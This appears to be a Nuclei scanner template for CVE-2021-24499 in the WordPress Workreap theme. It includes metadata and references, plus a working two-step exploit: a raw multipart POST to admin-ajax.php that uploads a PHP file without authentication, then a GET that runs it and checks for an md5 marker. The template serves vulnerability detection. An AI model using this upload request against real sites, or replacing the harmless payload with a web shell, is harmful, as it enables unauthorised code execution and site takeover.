id: CVE-2021-24499
info:
  name: WordPress Workreap - Remote Code Execution
  author: daffainfo
  severity: critical
  description: The WordPress Workreap theme has a vulnerability allowing for remote
    code execution due to lacking nonce checks and file validation, allowing for arbitrary
    file uploads including executable code by unauthenticated visitors.
  reference:
  - https://github.com/RyouYoo/CVE-2021-24499
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24499
  - https://wpscan.com/vulnerability/74611d5f-afba-42ae-bc19-777cdf2808cb
  - https://jetpack.com/2021/07/07/multiple-vulnerabilities-in-workreap-theme/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24499
    cwe-id: CWE-434
  tags: cve,cve2021,rce,workreap,wpscan,wordpress,wp-plugin,intrusive,wp
  metadata:
    impact: The impact of this vulnerability in WordPress Workreap theme is that an
      attacker can remotely execute code on the affected website, potentially gaining
      control of the site or stealing sensitive information.
    recommendation: I recommend updating WordPress Workreap theme to version 2.2.1
      to mitigate the risk of remote code execution vulnerability (CVE-2021-24499)
      caused by non-existent nonce checks and lack of user validation in AJAX actions.
requests:
- raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=------------------------cd0dc6bdc00b1cf9

    X-Requested-With: XMLHttpRequest


    -----------------------------cd0dc6bdc00b1cf9

    Content-Disposition: form-data; name="action"


    workreap_award_temp_file_uploader

    -----------------------------cd0dc6bdc00b1cf9

    Content-Disposition: form-data; name="award_img"; filename="{{randstr}}.php"

    Content-Type: application/x-httpd-php


    <?php echo md5("CVE-2021-24499"); ?>

    -----------------------------cd0dc6bdc00b1cf9--

    '
  - 'GET /wp-content/uploads/workreap-temp/{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 71abe5077dae2754c36d731cc1534d4d
  - type: status
    status:
    - 200
